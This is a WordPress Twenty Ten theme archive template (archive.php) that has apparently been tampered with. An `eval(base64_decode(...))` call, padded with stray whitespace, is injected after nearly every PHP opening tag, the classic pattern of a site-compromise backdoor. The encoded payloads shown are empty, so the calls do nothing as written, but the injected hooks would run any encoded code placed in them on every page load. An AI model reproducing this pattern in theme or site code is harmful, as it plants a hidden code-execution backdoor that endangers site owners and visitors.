<?php	 	eval(base64_decode(""));
/**
 * The template for displaying Archive pages.
 *
 * Used to display archive-type pages if nothing more specific matches a query.
 * For example, puts together date-based pages if no date.php file exists.
 *
 * Learn more: http://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage Twenty_Ten
 * @since Twenty Ten 1.0
 */

get_header(); ?>

		<div id="container">
			<div id="content" role="main">

<?php	 	eval(base64_decode(""));
	/* Queue the first post, that way we know
	 * what date we're dealing with (if that is the case).
	 *
	 * We reset this later so we can run the loop
	 * properly with a call to rewind_posts().
	 */
	if ( have_posts() )
		the_post();
?>

			<h1 class="page-title">
<?php	 	eval(base64_decode("")); if ( is_day() ) : ?>
				<?php	 	eval(base64_decode("")); printf( __( 'Daily Archives: <span>%s</span>', 'twentyten' ), get_the_date() ); ?>
<?php	 	eval(base64_decode("")); elseif ( is_month() ) : ?>
				<?php	 	eval(base64_decode("")); printf( __( 'Monthly Archives: <span>%s</span>', 'twentyten' ), get_the_date('F Y') ); ?>
<?php	 	eval(base64_decode("")); elseif ( is_year() ) : ?>
				<?php	 	eval(base64_decode("")); printf( __( 'Yearly Archives: <span>%s</span>', 'twentyten' ), get_the_date('Y') ); ?>
<?php	 	eval(base64_decode("")); else : ?>
				<?php	 	eval(base64_decode("")); _e( 'Blog Archives', 'twentyten' ); ?>
<?php	 	eval(base64_decode("")); endif; ?>
			</h1>

<?php	 	eval(base64_decode(""));
	/* Since we called the_post() above, we need to
	 * rewind the loop back to the beginning that way
	 * we can run the loop properly, in full.
	 */
	rewind_posts();

	/* Run the loop for the archives page to output the posts.
	 * If you want to overload this in a child theme then include a file
	 * called loop-archives.php and that will be used instead.
	 */
	 get_template_part( 'loop', 'archive' );
?>

			</div><!-- #content -->
		</div><!-- #container -->

<?php	 	eval(base64_decode("")); get_sidebar(); ?>
<?php	 	eval(base64_decode("")); get_footer(); ?>
